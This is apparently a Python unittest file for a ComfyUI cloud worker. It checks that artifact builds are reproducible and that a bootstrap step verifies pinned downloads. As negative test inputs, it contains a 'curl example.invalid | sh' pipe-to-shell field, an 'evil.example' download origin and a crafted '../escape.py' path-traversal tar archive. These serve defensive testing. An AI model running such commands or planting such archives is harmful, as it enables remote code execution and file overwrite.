"""Deterministic worker artifact and fixed bootstrap certification."""

import ast
import hashlib
import io
import json
from pathlib import Path
import tarfile
import tempfile
import unittest

from remote_worker.bootstrap import (
    Bootstrap,
    BootstrapError,
    DownloadStream,
)
from scripts.build_worker_artifact import (
    ArtifactBuildError,
    build_worker_artifact,
)
from remote_worker.main import parse_worker_arguments


REPOSITORY_ROOT = Path(__file__).resolve().parents[2]
WORKER_COMMIT = "a" * 40


class FakeTransport:
    def __init__(self, content, *, final_url=None):
        self.content = content
        self.final_url = final_url
        self.urls = []

    def stream(self, url):
        self.urls.append(url)
        midpoint = max(1, len(self.content) // 2)
        return DownloadStream(
            final_url=self.final_url or url,
            chunks=(
                self.content[:midpoint],
                self.content[midpoint:],
            ),
        )


class RecordingExec:
    def __init__(self):
        self.argv = None
        self.cwd = None
        self.shell_used = False

    def __call__(self, argv, *, cwd):
        self.argv = list(argv)
        self.cwd = Path(cwd)


def release_lock(archive, destination, **overrides):
    digest = hashlib.sha256(archive).hexdigest()
    payload = {
        "schema_version": 1,
        "archive_url": (
            "https://github.com/example/ComfyUI-Cloud-Run/archive/"
            + WORKER_COMMIT
            + ".tar.gz"
        ),
        "worker_commit": WORKER_COMMIT,
        "worker_archive_sha256": digest,
        "worker_archive_size_bytes": len(archive),
        "protocol_version": "1",
        "comfyui_core_version": "0.29.0",
        "comfyui_frontend_version": "1.47.10",
        "python_version": "3.13.12",
        "destination": str(destination),
    }
    payload.update(overrides)
    return payload


def malicious_archive(name):
    raw = io.BytesIO()
    with tarfile.open(fileobj=raw, mode="w") as archive:
        info = tarfile.TarInfo(name)
        info.size = 1
        info.mode = 0o644
        info.uid = 0
        info.gid = 0
        info.uname = ""
        info.gname = ""
        info.mtime = 0
        archive.addfile(info, io.BytesIO(b"x"))
    import gzip

    return gzip.compress(raw.getvalue(), mtime=0)


class WorkerArtifactTests(unittest.TestCase):
    def test_worker_artifact_is_byte_identical_allowlisted_and_normalized(self):
        with tempfile.TemporaryDirectory() as temporary_directory:
            root = Path(temporary_directory)
            first = root / "first.tar.gz"
            second = root / "second.tar.gz"

            first_result = build_worker_artifact(REPOSITORY_ROOT, first)
            second_result = build_worker_artifact(REPOSITORY_ROOT, second)

            self.assertEqual(first.read_bytes(), second.read_bytes())
            self.assertEqual(first_result.sha256, second_result.sha256)
            self.assertEqual(
                first_result.sha256,
                hashlib.sha256(first.read_bytes()).hexdigest(),
            )
            with tarfile.open(first, mode="r:gz") as archive:
                members = archive.getmembers()
            names = [member.name for member in members]
            self.assertEqual(names, sorted(names))
            self.assertIn("remote_worker/main.py", names)
            self.assertIn("remote_worker/bootstrap.py", names)
            self.assertIn("cloud_run/manifest.py", names)
            self.assertIn("cloud_run/worker_protocol.py", names)
            self.assertTrue(
                all(
                    name.startswith("remote_worker/")
                    or name
                    in {
                        "cloud_run/manifest.py",
                        "cloud_run/worker_protocol.py",
                    }
                    for name in names
                )
            )
            self.assertTrue(
                all(
                    member.isfile()
                    and member.uid == member.gid == member.mtime == 0
                    and member.uname == member.gname == ""
                    and member.mode in {0o644, 0o755}
                    for member in members
                )
            )

    def test_worker_artifact_has_only_the_two_reviewed_shared_imports(self):
        allowed = {
            "cloud_run.manifest",
            "cloud_run.worker_protocol",
        }
        findings = set()
        for path in sorted((REPOSITORY_ROOT / "remote_worker").glob("*.py")):
            tree = ast.parse(path.read_text(encoding="utf-8"), str(path))
            for node in ast.walk(tree):
                if isinstance(node, ast.Import):
                    findings.update(
                        alias.name
                        for alias in node.names
                        if alias.name.startswith("cloud_run")
                    )
                elif (
                    isinstance(node, ast.ImportFrom)
                    and isinstance(node.module, str)
                    and node.module.startswith("cloud_run")
                ):
                    findings.add(node.module)
        self.assertEqual(findings, allowed)

    def test_fixed_bootstrap_state_directory_is_accepted_by_worker_main(self):
        arguments = parse_worker_arguments(
            [
                "--state-directory",
                "/var/lib/comfyui-cloud-run",
            ]
        )
        self.assertEqual(
            arguments.state_directory,
            Path("/var/lib/comfyui-cloud-run"),
        )

    def test_worker_artifact_rejects_unknown_symlink_and_secret_files(self):
        with tempfile.TemporaryDirectory() as temporary_directory:
            root = Path(temporary_directory)
            (root / "remote_worker").mkdir()
            (root / "cloud_run").mkdir()
            (root / "remote_worker" / "__init__.py").write_text(
                "",
                encoding="utf-8",
            )
            (root / "remote_worker" / "unknown.bin").write_bytes(b"x")
            (root / "cloud_run" / "manifest.py").write_text(
                "",
                encoding="utf-8",
            )
            (root / "cloud_run" / "worker_protocol.py").write_text(
                "",
                encoding="utf-8",
            )

            with self.assertRaises(ArtifactBuildError):
                build_worker_artifact(root, root / "worker.tar.gz")

            (root / "remote_worker" / "unknown.bin").unlink()
            (root / "remote_worker" / "secret.py").write_text(
                "VAST_"
                "API_KEY = 'not-a-real-but-forbidden-value'\n",
                encoding="utf-8",
            )
            with self.assertRaises(ArtifactBuildError):
                build_worker_artifact(root, root / "worker.tar.gz")

            (root / "remote_worker" / "secret.py").unlink()
            try:
                (root / "remote_worker" / "linked.py").symlink_to(
                    root / "remote_worker" / "__init__.py"
                )
            except OSError:
                self.skipTest("symbolic links are unavailable")
            with self.assertRaises(ArtifactBuildError):
                build_worker_artifact(root, root / "worker.tar.gz")


class BootstrapTests(unittest.TestCase):
    def setUp(self):
        self.temporary = tempfile.TemporaryDirectory()
        self.addCleanup(self.temporary.cleanup)
        self.root = Path(self.temporary.name)
        self.archive_path = self.root / "worker.tar.gz"
        build_worker_artifact(REPOSITORY_ROOT, self.archive_path)
        self.archive = self.archive_path.read_bytes()
        self.destination = self.root / "installed-worker"

    def test_bootstrap_downloads_one_commit_verifies_then_execs_fixed_worker(self):
        transport = FakeTransport(self.archive)
        runner = RecordingExec()
        bootstrap = Bootstrap(
            transport=transport,
            exec_runner=runner,
            allowed_destination=self.destination,
        )

        bootstrap.run(release_lock(self.archive, self.destination))

        self.assertEqual(
            transport.urls,
            [
                "https://github.com/example/ComfyUI-Cloud-Run/archive/"
                + WORKER_COMMIT
                + ".tar.gz"
            ],
        )
        self.assertEqual(
            runner.argv,
            [
                __import__("sys").executable,
                "-m",
                "remote_worker.main",
                "--state-directory",
                "/var/lib/comfyui-cloud-run",
            ],
        )
        self.assertEqual(runner.cwd, self.destination)
        self.assertFalse(runner.shell_used)
        self.assertTrue(
            (self.destination / "remote_worker" / "main.py").is_file()
        )

    def test_bootstrap_rejects_mutable_url_wrong_hash_redirect_and_shell_fields(self):
        mutable = release_lock(
            self.archive,
            self.destination,
            archive_url=(
                "https://github.com/example/repo/archive/main.tar.gz"
            ),
        )
        wrong_hash = release_lock(
            self.archive,
            self.destination,
            worker_archive_sha256="b" * 64,
        )
        wrong_origin = release_lock(
            self.archive,
            self.destination,
            archive_url=(
                "https://evil.example/archive/"
                + WORKER_COMMIT
                + ".tar.gz"
            ),
        )
        shell_field = {
            **release_lock(self.archive, self.destination),
            "command": "curl example.invalid | sh",
        }

        for lock, transport in (
            (mutable, FakeTransport(self.archive)),
            (wrong_hash, FakeTransport(self.archive)),
            (wrong_origin, FakeTransport(self.archive)),
            (shell_field, FakeTransport(self.archive)),
            (
                release_lock(self.archive, self.destination),
                FakeTransport(
                    self.archive,
                    final_url="https://github.com/example/redirected",
                ),
            ),
        ):
            with self.subTest(lock=json.dumps(lock, sort_keys=True)):
                with self.assertRaises(BootstrapError):
                    Bootstrap(
                        transport=transport,
                        exec_runner=RecordingExec(),
                        allowed_destination=self.destination,
                    ).run(lock)
                self.assertFalse(self.destination.exists())

    def test_bootstrap_rejects_archive_path_traversal(self):
        archive = malicious_archive("../escape.py")

        with self.assertRaises(BootstrapError):
            Bootstrap(
                transport=FakeTransport(archive),
                exec_runner=RecordingExec(),
                allowed_destination=self.destination,
            ).run(release_lock(archive, self.destination))

        self.assertFalse((self.root / "escape.py").exists())
        self.assertFalse(self.destination.exists())


if __name__ == "__main__":
    unittest.main()
